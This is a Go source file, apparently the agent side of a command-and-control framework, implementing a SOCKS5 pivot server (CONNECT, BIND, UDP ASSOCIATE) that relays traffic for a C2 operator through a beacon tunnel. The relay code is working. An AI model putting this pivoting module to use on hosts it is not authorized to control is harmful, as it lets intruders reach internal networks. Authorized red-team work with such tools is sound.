//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// ─── Agent-side SOCKS5 Auth ────────────────────────────────────────────────
// When the agent acts as a SOCKS server (for forwarded connections from the
// C2 operator), it supports the same auth methods as the C2 server.
// For simplicity, agent SOCKS always accepts no-auth internally since the
// tunnel itself is already authenticated. External client auth is handled
// by the server side.

var (
	socksServersMu sync.Mutex
	socksServers   = map[string]net.Listener{}
)

func startSocksServer(addr string) error {
	socksServersMu.Lock()
	defer socksServersMu.Unlock()
	if existing, ok := socksServers[addr]; ok {
		_ = existing.Addr()
		return fmt.Errorf("SOCKS5 already listening on %s", addr)
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	socksServers[addr] = ln
	consecutiveAcceptErrors := 0
	go func() {
		debugLog("SOCKS5 listening on " + addr)
		for {
			conn, err := ln.Accept()
			if err != nil {
				// A single transient error (EMFILE under fd pressure) must not
				// kill the tunnel permanently — back off briefly and retry;
				// unregister only after repeated failures (matches the SSH
				// listener's 20-strike policy).
				consecutiveAcceptErrors++
				if consecutiveAcceptErrors > 20 {
					socksServersMu.Lock()
					delete(socksServers, addr)
					socksServersMu.Unlock()
					return
				}
				time.Sleep(time.Duration(consecutiveAcceptErrors) * 50 * time.Millisecond)
				continue
			}
			consecutiveAcceptErrors = 0
			go handleSocksConn(conn)
		}
	}()
	return nil
}

func stopSocksServer(addr string) error {
	socksServersMu.Lock()
	defer socksServersMu.Unlock()
	if addr == "" || addr == "stop" {
		if len(socksServers) == 0 {
			return fmt.Errorf("no SOCKS listeners running")
		}
		var first error
		for a, ln := range socksServers {
			if err := ln.Close(); err != nil && first == nil {
				first = err
			}
			delete(socksServers, a)
		}
		return first
	}
	ln, ok := socksServers[addr]
	if !ok {
		// Allow "1080" to match "0.0.0.0:1080" / "127.0.0.1:1080"
		for a, l := range socksServers {
			if a == addr || stringsHasPort(a, addr) {
				ln = l
				ok = true
				addr = a
				break
			}
		}
	}
	if !ok {
		return fmt.Errorf("no SOCKS listener on %s", addr)
	}
	delete(socksServers, addr)
	return ln.Close()
}

func stringsHasPort(addr, port string) bool {
	_, p, err := net.SplitHostPort(addr)
	return err == nil && p == port
}

// socksReadAddr reads a SOCKS5 address from a connection.
func socksReadAddr(conn net.Conn, atyp byte) (string, error) {
	switch atyp {
	case 0x01:
		ip := make([]byte, 4)
		portb := make([]byte, 2)
		if _, err := io.ReadFull(conn, ip); err != nil {
			return "", err
		}
		if _, err := io.ReadFull(conn, portb); err != nil {
			return "", err
		}
		return fmt.Sprintf("%d.%d.%d.%d:%d", ip[0], ip[1], ip[2], ip[3], int(portb[0])<<8|int(portb[1])), nil
	case 0x03:
		l := make([]byte, 1)
		if _, err := io.ReadFull(conn, l); err != nil {
			return "", err
		}
		dom := make([]byte, int(l[0]))
		if _, err := io.ReadFull(conn, dom); err != nil {
			return "", err
		}
		portb := make([]byte, 2)
		if _, err := io.ReadFull(conn, portb); err != nil {
			return "", err
		}
		return fmt.Sprintf("%s:%d", string(dom), int(portb[0])<<8|int(portb[1])), nil
	case 0x04:
		ip := make([]byte, 16)
		portb := make([]byte, 2)
		if _, err := io.ReadFull(conn, ip); err != nil {
			return "", err
		}
		if _, err := io.ReadFull(conn, portb); err != nil {
			return "", err
		}
		return fmt.Sprintf("[%s]:%d", net.IP(ip).String(), int(portb[0])<<8|int(portb[1])), nil
	default:
		return "", fmt.Errorf("unknown address type: 0x%02x", atyp)
	}
}

// socksReply sends a SOCKS5 reply.
func socksReplyAgent(conn net.Conn, rep byte, atyp byte, bindAddr string) {
	var bindIP net.IP
	var bindPort int
	if bindAddr != "" {
		if h, p, err := net.SplitHostPort(bindAddr); err == nil {
			bindIP = net.ParseIP(h)
			fmt.Sscanf(p, "%d", &bindPort)
		}
	}
	if bindIP == nil {
		bindIP = net.IPv4zero
	}
	bindIP4 := bindIP.To4()
	reply := []byte{0x05, rep, 0x00}
	if bindIP4 != nil {
		reply = append(reply, 0x01, bindIP4[0], bindIP4[1], bindIP4[2], bindIP4[3])
	} else {
		reply = append(reply, 0x04)
		reply = append(reply, bindIP.To16()...)
	}
	reply = append(reply, byte(bindPort>>8), byte(bindPort))
	conn.Write(reply)
}

// resolveThroughSOCKS resolves a domain name through the SOCKS server
// by having the server perform the DNS resolution.
func resolveThroughSOCKS(host string) (net.IP, error) {
	// Try direct DNS first
	ips, err := net.LookupHost(host)
	if err == nil && len(ips) > 0 {
		return net.ParseIP(ips[0]), nil
	}
	return nil, fmt.Errorf("DNS resolution failed for %s", host)
}

// handleSocksConn handles a single SOCKS5 connection from the agent's local SOCKS server.
// The agent's SOCKS server receives connections forwarded from the C2 operator through
// the beacon tunnel. It supports CONNECT, BIND, and UDP ASSOCIATE.
func handleSocksConn(conn net.Conn) {
	defer conn.Close()

	// Handshake bound: a client that connects and stalls would otherwise pin
	// this goroutine (and its fd) forever — every pre-auth read is bounded.
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	buf := make([]byte, 2)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return
	}
	if buf[0] != 0x05 {
		return
	}
	nmethods := int(buf[1])
	methods := make([]byte, nmethods)
	io.ReadFull(conn, methods)
	// Always accept no-auth (the tunnel itself is authenticated)
	conn.Write([]byte{0x05, 0x00})

	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return
	}
	if header[0] != 0x05 {
		socksReplyAgent(conn, 0x07, 0x01, "")
		return
	}

	switch header[1] {
	case 0x01: // CONNECT
		handleSocksConnect(conn, header[3])
	case 0x02: // BIND
		handleSocksBind(conn, header[3])
	case 0x03: // UDP ASSOCIATE
		handleSocksUDPAssociate(conn, header[3])
	default:
		socksReplyAgent(conn, 0x07, 0x01, "")
	}
}

func handleSocksConnect(conn net.Conn, atyp byte) {
	dstAddr, err := socksReadAddr(conn, atyp)
	if err != nil {
		socksReplyAgent(conn, 0x08, 0x01, "")
		return
	}

	// Resolve DNS if hostname
	host, port, err := net.SplitHostPort(dstAddr)
	if err != nil {
		socksReplyAgent(conn, 0x05, 0x01, "")
		return
	}
	if !tunnelRouteAllowed(host) {
		socksReplyAgent(conn, 0x02, 0x01, "") // connection not allowed by ruleset
		return
	}
	// If host is a domain (not IP), resolve it
	if net.ParseIP(host) == nil {
		resolved, err := resolveThroughSOCKS(host)
		if err != nil {
			socksReplyAgent(conn, 0x04, 0x01, "")
			return
		}
		dstAddr = fmt.Sprintf("%s:%s", resolved.String(), port)
	}

	target, err := net.DialTimeout("tcp", dstAddr, 10*time.Second)
	if err != nil {
		socksReplyAgent(conn, 0x05, 0x01, "")
		return
	}
	defer target.Close()

	socksReplyAgent(conn, 0x00, 0x01, dstAddr)

	// Half-close propagation: when the client side finishes writing, the
	// target must see EOF too, or protocols that reply only after reading
	// EOF hang until timeout through the tunnel.
	go func() {
		io.Copy(target, conn)
		if tc, ok := target.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
	}()
	io.Copy(conn, target)
}

func handleSocksBind(conn net.Conn, atyp byte) {
	// BIND on agent side: client expects us to listen for inbound connections
	bindAddr, err := socksReadAddr(conn, atyp)
	if err != nil {
		socksReplyAgent(conn, 0x08, 0x01, "")
		return
	}

	// Extract port
	_, portStr, _ := net.SplitHostPort(bindAddr)
	var bindPort int
	fmt.Sscanf(portStr, "%d", &bindPort)

	if bindPort == 0 {
		bindPort = 0
	}

	listenAddr := fmt.Sprintf("0.0.0.0:%d", bindPort)
	ln, err := net.Listen("tcp", listenAddr)
	if err != nil {
		socksReplyAgent(conn, 0x01, 0x01, "")
		return
	}
	defer ln.Close()

	actualPort := ln.Addr().(*net.TCPAddr).Port
	bindResp := fmt.Sprintf("0.0.0.0:%d", actualPort)
	socksReplyAgent(conn, 0x00, 0x01, bindResp)

	tcpLn := ln.(*net.TCPListener)
	tcpLn.SetDeadline(time.Now().Add(60 * time.Second))
	targetConn, err := tcpLn.Accept()
	if err != nil {
		return
	}
	defer targetConn.Close()

	remoteAddr := targetConn.RemoteAddr().String()
	socksReplyAgent(conn, 0x00, 0x01, remoteAddr)

	go func() {
		io.Copy(targetConn, conn)
		if tc, ok := targetConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
	}()
	io.Copy(conn, targetConn)
}

// handleSocksUDPAssociate implements SOCKS5 UDP ASSOCIATE (RFC 1928 §7).
// The TCP control connection is held open for the lifetime of the association.
func handleSocksUDPAssociate(conn net.Conn, atyp byte) {
	if _, err := socksReadAddr(conn, atyp); err != nil {
		socksReplyAgent(conn, 0x08, 0x01, "")
		return
	}

	udpConn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
	if err != nil {
		socksReplyAgent(conn, 0x01, 0x01, "")
		return
	}
	defer udpConn.Close()

	udpAddr := udpConn.LocalAddr().(*net.UDPAddr)
	socksReplyAgent(conn, 0x00, 0x01, fmt.Sprintf("0.0.0.0:%d", udpAddr.Port))

	done := make(chan struct{})
	go func() {
		buf := make([]byte, 1)
		_, _ = conn.Read(buf)
		close(done)
	}()

	var clientAddr *net.UDPAddr
	pkt := make([]byte, 65535)
	for {
		select {
		case <-done:
			return
		default:
		}
		_ = udpConn.SetReadDeadline(time.Now().Add(30 * time.Second))
		n, src, err := udpConn.ReadFromUDP(pkt)
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				select {
				case <-done:
					return
				default:
					continue
				}
			}
			return
		}
		data := pkt[:n]
		isClient := clientAddr == nil || (src.IP.Equal(clientAddr.IP) && src.Port == clientAddr.Port)
		if isClient && n >= 10 && data[0] == 0 && data[1] == 0 && data[2] == 0 {
			dst, headerLen, err := parseSocksUDPHeader(data)
			if err != nil {
				continue
			}
			host, _, _ := net.SplitHostPort(dst)
			if host != "" && !tunnelRouteAllowed(host) {
				continue
			}
			clientAddr = src
			raddr, err := net.ResolveUDPAddr("udp", dst)
			if err != nil {
				continue
			}
			_, _ = udpConn.WriteToUDP(data[headerLen:], raddr)
			continue
		}
		if clientAddr != nil {
			framed := encodeSocksUDPHeader(src, data)
			_, _ = udpConn.WriteToUDP(framed, clientAddr)
		}
	}
}

func parseSocksUDPHeader(b []byte) (dst string, headerLen int, err error) {
	if len(b) < 7 {
		return "", 0, fmt.Errorf("short")
	}
	atyp := b[3]
	switch atyp {
	case 0x01:
		if len(b) < 10 {
			return "", 0, fmt.Errorf("short ipv4")
		}
		ip := net.IP(b[4:8])
		port := binary.BigEndian.Uint16(b[8:10])
		return fmt.Sprintf("%s:%d", ip.String(), port), 10, nil
	case 0x03:
		if len(b) < 5 {
			return "", 0, fmt.Errorf("short domain")
		}
		l := int(b[4])
		if len(b) < 5+l+2 {
			return "", 0, fmt.Errorf("short domain body")
		}
		host := string(b[5 : 5+l])
		port := binary.BigEndian.Uint16(b[5+l : 7+l])
		return fmt.Sprintf("%s:%d", host, port), 7 + l, nil
	case 0x04:
		if len(b) < 22 {
			return "", 0, fmt.Errorf("short ipv6")
		}
		ip := net.IP(b[4:20])
		port := binary.BigEndian.Uint16(b[20:22])
		return fmt.Sprintf("[%s]:%d", ip.String(), port), 22, nil
	default:
		return "", 0, fmt.Errorf("bad atyp")
	}
}

func encodeSocksUDPHeader(from *net.UDPAddr, payload []byte) []byte {
	ip4 := from.IP.To4()
	var hdr []byte
	if ip4 != nil {
		hdr = []byte{0x00, 0x00, 0x00, 0x01, ip4[0], ip4[1], ip4[2], ip4[3], byte(from.Port >> 8), byte(from.Port)}
	} else {
		ip16 := from.IP.To16()
		hdr = []byte{0x00, 0x00, 0x00, 0x04}
		hdr = append(hdr, ip16...)
		hdr = append(hdr, byte(from.Port>>8), byte(from.Port))
	}
	return append(hdr, payload...)
}
